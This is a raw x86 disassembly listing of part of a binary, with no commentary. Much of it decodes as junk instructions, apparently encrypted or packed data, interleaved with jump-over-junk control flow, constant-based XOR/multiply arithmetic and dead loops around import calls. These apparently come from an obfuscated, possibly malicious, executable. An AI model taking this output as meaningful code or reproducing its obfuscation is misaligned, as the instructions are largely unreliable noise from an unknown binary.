  40a84e:	dec    ecx
  40a84f:	std    
  40a850:	call   0x118126b8
  40a855:	cmp    al,0x2a
  40a857:	outs   dx,BYTE PTR ds:[esi]
  40a858:	inc    ecx
  40a859:	lahf   
  40a85a:	mov    ah,0x25
  40a85c:	in     eax,0x79
  40a85e:	data16 lods al,BYTE PTR ds:[esi]
  40a860:	arpl   ax,si
  40a862:	pop    esi
  40a863:	loop   0x40a87d
  40a865:	(bad)  
  40a866:	scas   eax,DWORD PTR es:[edi]
  40a867:	jns    0x40a88e
  40a869:	cmp    DWORD PTR [ebx+0x7f84afc8],eax
  40a86f:	and    eax,0x10028541
  40a874:	adc    eax,0x28aa623d
  40a879:	mov    edx,DWORD PTR [ebx]
  40a87b:	fcom   DWORD PTR [esi+0x4e]
  40a87e:	(bad)  
  40a880:	cmp    ecx,DWORD PTR [ebx]
  40a882:	test   eax,0xda778a90
  40a887:	mov    bl,0xf7
  40a889:	ja     0x40a8c0
  40a88b:	out    dx,eax
  40a88c:	mov    esp,0x58d008a7
  40a891:	and    al,0xd2
  40a893:	imul   di,dx,0x1f
  40a897:	mov    cl,0x52
  40a899:	dec    eax
  40a89a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a89b:	(bad)  
  40a89c:	cmp    BYTE PTR [edi+0x270193c3],dl
  40a8a2:	jmp    0x40a85f
  40a8a4:	out    0x68,eax
  40a8a6:	cmp    cl,0xee
  40a8a9:	dec    ecx
  40a8aa:	add    ebp,DWORD PTR [edx+eiz*8+0x2b25dba2]
  40a8b1:	or     ebp,DWORD PTR [ebp+0x6]
  40a8b4:	xor    DWORD PTR [edi],ebp
  40a8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8b7:	jns    0x40a8f5
  40a8b9:	pop    edx
  40a8ba:	repz jnp 0x40a869
  40a8bd:	cmp    bh,BYTE PTR [esi]
  40a8bf:	cmp    BYTE PTR [ecx],al
  40a8c1:	out    dx,eax
  40a8c2:	mov    esp,0x8105eacf
  40a8c7:	dec    esi
  40a8c8:	jns    0x40a88d
  40a8ca:	pop    es
  40a8cb:	push   edx
  40a8cc:	mov    esi,eax
  40a8ce:	ins    BYTE PTR es:[edi],dx
  40a8cf:	stos   BYTE PTR es:[edi],al
  40a8d0:	and    DWORD PTR [edi-0x2a],0xffffffdd
  40a8d4:	jno    0x40a92f
  40a8d6:	push   ecx
  40a8d7:	mov    bl,0x2a
  40a8d9:	xchg   ecx,eax
  40a8da:	add    DWORD PTR [ebx],eax
  40a8dc:	push   esp
  40a8dd:	sbb    eax,0x7fae128c
  40a8e2:	mov    ah,0x9a
  40a8e4:	push   es
  40a8e5:	xor    dh,bh
  40a8e7:	cs push ebp
  40a8e9:	sbb    ecx,DWORD PTR [esi+0x577a6d2d]
  40a8ef:	cwde   
  40a8f0:	inc    esi
  40a8f1:	add    DWORD PTR [ebx+esi*4+0x82f6ffd],esp
  40a8f8:	jp     0x40a87e
  40a8fa:	mov    esi,0x7502fdfb
  40a8ff:	fldcw  WORD PTR [ebx-0x4b]
  40a902:	dec    esi
  40a903:	push   ebp
  40a904:	xchg   DWORD PTR [eax-0x71fe112a],eax
  40a90a:	gs sbb eax,0xef8a7a89
  40a910:	pop    edi
  40a911:	daa    
  40a912:	fldcw  WORD PTR [edi+edx*2-0xe1d2875]
  40a919:	repz push ebx
  40a91b:	mov    eax,DWORD PTR [ebp-0x4]
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	fist   DWORD PTR ds:0x3ae0d13a
  40a9ac:	jle    0x40aa2c
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a9fc
  40a9b3:	inc    ecx
  40a9b4:	dec    edx
  40a9b5:	mov    ebx,0xb84a6a56
  40a9ba:	inc    esi
  40a9bb:	jno    0x40aa37
  40a9bd:	and    DWORD PTR [eax],esp
  40a9bf:	aam    0x64
  40a9c1:	clc    
  40a9c2:	das    
  40a9c3:	test   BYTE PTR cs:[edx+ebx*4],ah
  40a9c7:	ficom  DWORD PTR [eax-0x4e]
  40a9ca:	fsubr  st(4),st
  40a9cc:	call   0xdad4:0x72bfd38f
  40a9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d4:	imul   ebx,ecx,0x380ed0b6
  40a9da:	mov    al,ds:0x145af8c3
  40a9df:	add    DWORD PTR [ebx],edx
  40a9e1:	lods   eax,DWORD PTR ds:[esi]
  40a9e2:	jle    0x40a966
  40a9e4:	getsec 
  40a9e6:	mov    esp,0x3d9ccc27
  40a9eb:	mov    cs,WORD PTR [ebp-0x7a]
  40a9ee:	es push 0x3d
  40a9f1:	bound  esi,QWORD PTR [ebx+edx*1+0x1c5fc152]
  40a9f8:	sbb    al,0x2a
  40a9fa:	mov    eax,ds:0x4895a194
  40a9ff:	mov    esi,0xc6f42cb5
  40aa04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa05:	cmp    eax,DWORD PTR [edx]
  40aa07:	push   esp
  40aa08:	inc    edi
  40aa09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa0a:	pop    es
  40aa0b:	icebp  
  40aa0c:	mov    cl,0xe7
  40aa0e:	adc    DWORD PTR [ebx+0x1e],ecx
  40aa11:	mov    ecx,0x30da71e5
  40aa16:	stc    
  40aa17:	es jl  0x40a9c2
  40aa1a:	imul   BYTE PTR [edx+ebp*2-0x21a1236b]
  40aa21:	fstp   DWORD PTR [ecx]
  40aa23:	push   edi
  40aa24:	dec    ebx
  40aa25:	mov    eax,ds:0xb44a3213
  40aa2a:	xchg   ebp,eax
  40aa2b:	lods   al,BYTE PTR ds:[esi]
  40aa2c:	cs mov ebx,0x8a0e2f4
  40aa32:	psraw  mm4,mm7
  40aa35:	(bad)  
  40aa36:	jmp    0x40aa54
  40aa38:	dec    edx
  40aa39:	add    eax,0x13e9e76c
  40aa3e:	test   DWORD PTR [edi-0x6f],ebx
  40aa41:	(bad)  
  40aa42:	outs   dx,DWORD PTR ds:[esi]
  40aa43:	in     eax,0x38
  40aa45:	xchg   ecx,eax
  40aa46:	retf   
  40aa47:	fld    TBYTE PTR [ecx-0x4]
  40aa4a:	xor    al,0x2c
  40aa4c:	xchg   BYTE PTR [esp+edx*1+0x8],dh
  40aa50:	inc    ebx
  40aa51:	jmp    0xe5274664
  40aa56:	shl    BYTE PTR [edi],0x4a
  40aa59:	mul    DWORD PTR [edi-0x1c]
  40aa5c:	sbb    al,0x71
  40aa5e:	out    dx,al
  40aa5f:	(bad)  
  40aa60:	cmp    eax,0x4d922358
  40aa65:	add    esp,DWORD PTR [eax-0x30]
  40aa68:	ror    BYTE PTR [ebx],1
  40aa6a:	mov    ds:0xdf2cdcf2,eax
  40aa6f:	sub    DWORD PTR [esi-0x43],esp
  40aa72:	sbb    DWORD PTR [ecx-0xc2b49d3],ebp
  40aa78:	sbb    eax,0xfce70a
  40aa7d:	lahf   
  40aa7e:	fs cmp eax,0xe7d28ce5
  40aa84:	push   ss
  40aa85:	lock jns 0x40aa3e
  40aa88:	retf   
  40aa89:	fucomip st,st(7)
  40aa8b:	std    
  40aa8c:	sub    eax,0x5c14929f
  40aa91:	or     BYTE PTR [edi+0x72e27d4d],0x21
  40aa98:	ja     0x40aae9
  40aa9a:	sbb    edx,DWORD PTR [eax+eiz*8+0x620eaca8]
  40aaa1:	push   0x79b139c4
  40aaa6:	mov    ah,0x87
  40aaa8:	mov    edx,0x85e368ec
  40aaad:	or     al,0x83
  40aaaf:	mov    edx,0xd718d961
  40aab4:	push   0xffffffcc
  40aab6:	sub    eax,0x51ee46e0
  40aabb:	adc    al,0xba
  40aabd:	mov    ebp,0x33b964c7
  40aac2:	add    DWORD PTR ds:[esi-0x62],0xcd742e19
  40aaca:	jle    0x40ab3a
  40aacc:	outs   dx,DWORD PTR ds:[esi]
  40aacd:	stos   BYTE PTR es:[edi],al
  40aace:	mov    dh,0x4c
  40aad0:	call   0xa2465183
  40aad5:	jo     0x40ab2b
  40aad7:	jmp    0x6bae:0x7c3a8940
  40aade:	retf   
  40aadf:	pop    ds
  40aae0:	mov    bl,0xd3
  40aae2:	jbe    0x40aaa4
  40aae4:	not    DWORD PTR [ebx-0x5782b59a]
  40aaea:	shr    ecx,1
  40aaec:	int3   
  40aaed:	sbb    al,0xf4
  40aaef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf0:	stc    
  40aaf1:	mov    eax,ds:0xed65e5f1
  40aaf6:	dec    esi
  40aaf7:	int3   
  40aaf8:	push   0xd290b01f
  40aafd:	pop    ds
  40aafe:	enter  0x1492,0xf8
  40ab02:	mov    eax,0xd26967b2
  40ab07:	sub    al,0xe3
  40ab09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab0a:	div    DWORD PTR [eax]
  40ab0c:	dec    edi
  40ab0d:	xor    eax,edx
  40ab0f:	xor    esi,edx
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x7cccac8b
  40ab26:	loop   0x40ab3d
  40ab28:	dec    edi
  40ab29:	cmp    edi,DWORD PTR [esi+0x7e]
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40aaee
  40ab31:	loope  0x40ab89
  40ab33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab34:	pop    ebx
  40ab35:	mov    DWORD PTR [eax+esi*4-0x3d5f7db5],edx
  40ab3c:	jg     0x40ab35
  40ab3e:	pop    edi
  40ab3f:	das    
  40ab40:	push   es
  40ab41:	pop    ebp
  40ab42:	lahf   
  40ab43:	(bad)  
  40ab44:	sbb    DWORD PTR [edi-0x6e],edx
  40ab47:	xor    esp,edi
  40ab49:	pushf  
  40ab4a:	clc    
  40ab4b:	mov    cs,WORD PTR [eax+eiz*8+0x64eb0406]
  40ab52:	repz mov cl,0x98
  40ab55:	jne    0x40ab6e
  40ab57:	dec    edx
  40ab58:	nop
  40ab59:	test   al,0x3b
  40ab5b:	add    esp,DWORD PTR [eax+0x7f]
  40ab5e:	and    eax,0x49346644
  40ab63:	loop   0x40aae8
  40ab65:	jns    0x40ab83
  40ab67:	dec    ebx
  40ab68:	std    
  40ab69:	(bad)  
  40ab6b:	iret   
  40ab6c:	loop   0x40aba2
  40ab6e:	aam    0x3a
  40ab70:	aas    
  40ab71:	mov    edx,0x5081a9be
  40ab76:	jae    0x40abb0
  40ab78:	pop    esi
  40ab79:	and    BYTE PTR [ecx-0x3bb194c0],al
  40ab7f:	cmc    
  40ab80:	xor    ecx,0xffffffc6
  40ab83:	inc    esi
  40ab84:	mov    ds:0xaaf42b2f,al
  40ab89:	cld    
  40ab8a:	aas    
  40ab8b:	test   cl,bh
  40ab8d:	jbe    0x40ab9e
  40ab8f:	cwde   
  40ab90:	xchg   DWORD PTR [edx-0x32],edx
  40ab93:	neg    BYTE PTR [ebp-0x45]
  40ab96:	push   esi
  40ab97:	vmread DWORD PTR [ebp-0x1c],ebx
  40ab9b:	test   cl,al
  40ab9d:	std    
  40ab9e:	adc    eax,0x3f0934d1
  40aba3:	cmp    BYTE PTR [ebx+eiz*2],dl
  40aba6:	inc    ebp
  40aba7:	add    al,0x4c
  40aba9:	popa   
  40abaa:	sub    bl,BYTE PTR [ebp+esi*8-0x41f41e7d]
  40abb1:	in     eax,dx
  40abb2:	out    0x41,eax
  40abb4:	and    edi,edi
  40abb6:	bound  esi,QWORD PTR [ebx+0x6e]
  40abb9:	ja     0x40ab52
  40abbb:	push   esi
  40abbc:	fimul  WORD PTR [eax+0x7d71df97]
  40abc2:	add    DWORD PTR [esi-0x2a9b2fa3],edx
  40abc8:	cmc    
  40abc9:	test   eax,0x2b596579
  40abce:	(bad)  
  40abcf:	pushf  
  40abd0:	inc    edi
  40abd1:	jmp    0x5970432c
  40abd6:	sub    ebp,DWORD PTR [ecx+0x9]
  40abd9:	pop    ebp
  40abda:	sbb    bl,cl
  40abdc:	mov    WORD PTR [edi],?
  40abde:	in     eax,dx
  40abdf:	sbb    eax,0x8bf2a323
  40abe4:	pop    ebp
  40abe5:	ja     0x40ac5b
  40abe7:	jns    0x40abf5
  40abe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abea:	dec    ebx
  40abeb:	xor    ch,bh
  40abed:	push   ebx
  40abee:	mov    al,0xcf
  40abf0:	or     edx,DWORD PTR [ecx-0x1a]
  40abf3:	mov    ebp,esp
  40abf5:	push   esp
  40abf6:	mov    ah,0x61
  40abf8:	pop    esp
  40abf9:	inc    ecx
  40abfa:	mov    al,ds:0x63101900
  40abff:	fdivr  DWORD PTR [eax+esi*2+0x6f]
  40ac03:	rcr    edx,1
  40ac05:	in     eax,0xc3
  40ac07:	add    eax,0x2e22cae5
  40ac0c:	or     al,0xaf
  40ac0e:	cmp    DWORD PTR [esi-0x18],0xaf83607f
  40ac15:	je     0x40ac01
  40ac17:	mul    DWORD PTR [ebp-0x36e06460]
  40ac1d:	ffreep st(1)
  40ac1f:	inc    esi
  40ac20:	inc    ecx
  40ac21:	mov    ds:0x945eab63,al
  40ac26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac27:	mov    dl,0xdd
  40ac29:	(bad)  
  40ac2b:	jle    0x40ac96
  40ac2d:	jb     0x40abda
  40ac2f:	cmp    BYTE PTR ds:0xd72ca2d0,bl
  40ac35:	(bad)  
  40ac36:	out    dx,al
  40ac37:	repnz fmul DWORD PTR fs:[ebx+ecx*1+0x6]
  40ac3d:	jnp    0x40aca7
  40ac3f:	xchg   BYTE PTR [eax-0x5],bl
  40ac42:	imul   esi,DWORD PTR [edi+edi*1],0x61
  40ac46:	mov    cl,0x40
  40ac48:	push   esi
  40ac49:	sbb    ch,BYTE PTR [ebp+0x2c]
  40ac4c:	idiv   DWORD PTR [ebx+0x1b7940fb]
  40ac52:	(bad)  
  40ac54:	inc    ebx
  40ac55:	jge    0x40accf
  40ac57:	out    dx,eax
  40ac58:	dec    edi
  40ac59:	jge    0x40ac91
  40ac5b:	stc    
  40ac5c:	clc    
  40ac5d:	jmp    0x40acb2
  40ac5f:	out    0x2d,eax
  40ac61:	push   eax
  40ac62:	sahf   
  40ac63:	push   ebx
  40ac64:	hlt    
  40ac65:	or     al,BYTE PTR [edi+eiz*1+0x2345afcb]
  40ac6c:	ds sti 
  40ac6e:	add    ch,BYTE PTR [esi]
  40ac70:	shl    BYTE PTR [eax],1
  40ac72:	shl    DWORD PTR [ebp+0x4e],cl
  40ac75:	das    
  40ac76:	cmp    dl,BYTE PTR [edx-0x48ceef8c]
  40ac7c:	mov    edx,?
  40ac7e:	mov    edx,0xc6ca1013
  40ac83:	xchg   edx,eax
  40ac84:	fldenv [ecx+0x2d]
  40ac87:	dec    edx
  40ac88:	in     eax,0x29
  40ac8a:	cs add esi,ecx
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edi,DWORD PTR [eax+0x2a57e927]
  40acc0:	cmp    DWORD PTR [esi+0x7e],edi
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ac82
  40acc8:	in     al,dx
  40acc9:	pop    ebp
  40acca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40accb:	sub    eax,0x83ef098a
  40acd0:	jp     0x40ad30
  40acd2:	xchg   al,bh
  40acd4:	aaa    
  40acd5:	mov    edx,0xf5f91256
  40acda:	shr    BYTE PTR [eax+0x53de342c],0x82
  40ace1:	push   cs
  40ace2:	pusha  
  40ace3:	lahf   
  40ace4:	mov    bh,BYTE PTR [edx-0x4b]
  40ace7:	adc    DWORD PTR [esp+eax*2+0x69360336],ebx
  40acee:	dec    edi
  40acef:	out    dx,al
  40acf0:	xor    al,0x50
  40acf2:	sub    bl,dl
  40acf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf5:	icebp  
  40acf6:	fild   QWORD PTR [esi+edi*4]
  40acf9:	push   eax
  40acfa:	pop    ss
  40acfb:	je     0x40ad1b
  40acfd:	xchg   esp,edx
  40acff:	mov    dh,0x4
  40ad01:	div    BYTE PTR [edx+0x2d]
  40ad04:	push   ebx
  40ad05:	add    ah,ch
  40ad07:	sbb    BYTE PTR [ecx-0x721ed540],ah
  40ad0d:	mov    dl,0x12
  40ad0f:	pop    esi
  40ad10:	loop   0x40acda
  40ad12:	jnp    0x40ace3
  40ad14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad15:	mov    ecx,0x96ad0699
  40ad1a:	loope  0x40acf2
  40ad1c:	sbb    edx,DWORD PTR [ebx]
  40ad1e:	(bad)  
  40ad1f:	push   ss
  40ad20:	in     eax,0xdd
  40ad22:	adc    dh,BYTE PTR [ebx-0x1f]
  40ad25:	out    0xdb,eax
  40ad27:	sub    eax,0x57f1df08
  40ad2c:	jns    0x40acd3
  40ad2e:	jg     0x40ad71
  40ad30:	cmc    
  40ad31:	out    0xca,eax
  40ad33:	jecxz  0x40ad21
  40ad35:	scas   eax,DWORD PTR es:[edi]
  40ad36:	sub    ch,BYTE PTR [edi]
  40ad38:	sub    DWORD PTR [esi-0x23],edi
  40ad3b:	dec    ebp
  40ad3c:	sub    ebp,DWORD PTR [edi-0x8]
  40ad3f:	pop    ecx
  40ad40:	jmp    0xe6fc9178
  40ad45:	retf   
  40ad46:	call   0x77204893
  40ad4b:	inc    esp
  40ad4c:	inc    ecx
  40ad4d:	in     eax,dx
  40ad4e:	and    ah,ch
  40ad50:	les    edi,FWORD PTR [ebp-0x20a5675f]
  40ad56:	in     eax,0xdb
  40ad58:	sub    DWORD PTR [eax],edx
  40ad5a:	in     eax,0xe6
  40ad5c:	call   0x619a:0xa228b6ff
  40ad63:	pop    edx
  40ad64:	xlat   BYTE PTR ds:[ebx]
  40ad65:	add    DWORD PTR [edx+0x6e84c19],0x3
  40ad6c:	test   eax,0x5cc87bbd
  40ad71:	ds mov al,0x2a
  40ad74:	call   0x5c39:0x49730559
  40ad7b:	inc    ecx
  40ad7c:	push   ebx
  40ad7d:	push   edi
  40ad7e:	lahf   
  40ad7f:	and    BYTE PTR [edi+0x2454bd93],bh
  40ad85:	(bad)  
  40ad86:	cld    
  40ad87:	dec    ebx
  40ad88:	gs int 0x2b
  40ad8b:	add    ch,al
  40ad8d:	popf   
  40ad8e:	mov    ds:0x1dde0f9b,eax
  40ad93:	sub    BYTE PTR [edi+0x61],dh
  40ad96:	xchg   BYTE PTR [edi+0x3fa4a12],ch
  40ad9c:	push   edi
  40ad9d:	mov    ds:0xb62a2346,al
  40ada2:	xchg   esp,esi
  40ada4:	adc    DWORD PTR [ebx-0x3eed076d],edx
  40adaa:	lea    edi,[edi]
  40adac:	cmp    al,0x9d
  40adae:	sub    DWORD PTR [ebp-0x588d0a1],esp
  40adb4:	int3   
  40adb5:	call   0x7047:0x6bdeaab5
  40adbc:	call   0xc49fdadd
  40adc1:	cmp    ah,0x24
  40adc4:	adc    DWORD PTR [edx],0x2de2547
  40adca:	adc    al,0x85
  40adcc:	pop    esp
  40adcd:	adc    cl,ah
  40adcf:	retf   
  40add0:	mov    cl,0x39
  40add2:	cld    
  40add3:	fdiv   st,st(0)
  40add5:	jno    0x40ae10
  40add7:	mov    esi,0x3711da24
  40addc:	inc    edx
  40addd:	or     DWORD PTR [edi-0x7aba7ad6],esi
  40ade3:	sub    al,0x10
  40ade5:	fidiv  DWORD PTR [ebx-0x4e1e215f]
  40adeb:	jns    0x40adce
  40aded:	ins    DWORD PTR es:[edi],dx
  40adee:	sbb    cl,BYTE PTR [ebx-0x5b]
  40adf1:	(bad)  
  40adf2:	addr16 out 0x86,eax
  40adf5:	and    al,0xf0
  40adf7:	imul   esi,DWORD PTR [ebp+0x2e0a4123],0x240bada7
  40ae01:	popa   
  40ae02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae03:	and    ebp,DWORD PTR [edx+0x4c]
  40ae06:	pop    ds
  40ae07:	(bad)  
  40ae08:	mov    eax,0x89d80da9
  40ae0d:	loop   0x40ae46
  40ae0f:	push   ecx
  40ae10:	add    BYTE PTR [ebp+0x33b95983],ah
  40ae16:	test   DWORD PTR [eax+0x5ed51fe8],esp
  40ae1c:	push   cs
  40ae1d:	test   BYTE PTR [esi],0x76
  40ae20:	sub    al,0x7c
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x23268d5d
  40ae94:	sub    edi,DWORD PTR [ebx]
  40ae96:	jg     0x40ae89
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	inc    ebp
  40aea0:	fistp  QWORD PTR [esi-0x79788ed1]
  40aea6:	or     al,0x86
  40aea8:	push   edx
  40aea9:	mov    al,0x66
  40aeab:	inc    edx
  40aeac:	and    BYTE PTR [edi+0x71bacd64],dl
  40aeb2:	(bad)  
  40aeb4:	inc    esi
  40aeb5:	imul   ebp,DWORD PTR [ecx-0x3910c724],0xffffff94
  40aebc:	neg    BYTE PTR [eax+0x39]
  40aebf:	pop    edi
  40aec0:	dec    ebx
  40aec1:	les    eax,FWORD PTR gs:[eax]
  40aec4:	jb     0x40aed0
  40aec6:	ins    BYTE PTR es:[edi],dx
  40aec7:	add    al,0x35
  40aec9:	call   0xbcfab048
  40aece:	test   eax,0x2104160e
  40aed3:	jbe    0x40af37
  40aed5:	push   es
  40aed6:	inc    ebp
  40aed7:	xor    ah,BYTE PTR [ebx-0x70098830]
  40aedd:	jb     0x40aee0
  40aedf:	mov    bh,0x2a
  40aee1:	daa    
  40aee2:	push   edx
  40aee3:	fbstp  TBYTE PTR [edx-0x44]
  40aee6:	push   edi
  40aee7:	and    ah,BYTE PTR [ecx-0x5cdf15e1]
  40aeed:	xchg   esi,eax
  40aeee:	pop    esi
  40aeef:	and    ebp,ebp
  40aef1:	bound  ebp,QWORD PTR [eax-0x5f6a8806]
  40aef7:	and    dh,BYTE PTR [edi]
  40aef9:	ret    
  40aefa:	fmul   st,st(4)
  40aefc:	cmp    eax,0x96c60ba5
  40af01:	adc    DWORD PTR [esi+0x44],eax
  40af04:	loop   0x40aed1
  40af06:	js     0x40aef7
  40af08:	imul   edi,DWORD PTR [eax+eiz*8],0x993b4963
  40af0f:	add    al,0xb4
  40af11:	jb     0x40af35
  40af13:	icebp  
  40af14:	adc    ecx,ecx
  40af16:	lahf   
  40af17:	outs   dx,DWORD PTR ds:[esi]
  40af18:	jge    0x40af1d
  40af1a:	cld    
  40af1b:	pop    esi
  40af1c:	or     BYTE PTR [ecx+0xe8c3a8e],dl
  40af22:	pop    ds
  40af23:	loop   0x40af44
  40af25:	lds    esi,FWORD PTR [eax+0x1c]
  40af28:	mov    DWORD PTR [ebp-0x69b09feb],esp
  40af2e:	cwde   
  40af2f:	jo     0x40af7e
  40af31:	inc    ecx
  40af32:	(bad)  
  40af33:	stc    
  40af34:	xchg   esp,eax
  40af35:	xchg   edx,eax
  40af36:	sbb    al,0x50
  40af38:	jnp    0x40af96
  40af3a:	scas   al,BYTE PTR es:[edi]
  40af3b:	xor    ch,dh
  40af3d:	stos   DWORD PTR es:[edi],eax
  40af3e:	cli    
  40af3f:	sub    al,0x5
  40af41:	dec    ebp
  40af42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af43:	jge    0x40aef4
  40af45:	cmp    eax,0x98094b6c
  40af4a:	arpl   bp,si
  40af4c:	inc    ebp
  40af4d:	cmp    ebx,DWORD PTR [ebx-0x45]
  40af50:	dec    edx
  40af51:	mov    ebp,0xf75aa5c5
  40af56:	mov    BYTE PTR [esi+0x369db465],bh
  40af5c:	ja     0x40afbb
  40af5e:	cs hlt 
  40af60:	call   0x212c515f
  40af65:	adc    ecx,DWORD PTR [esi+0x32729fbb]
  40af6b:	add    BYTE PTR [ebx],al
  40af6d:	retf   
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4235c3,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
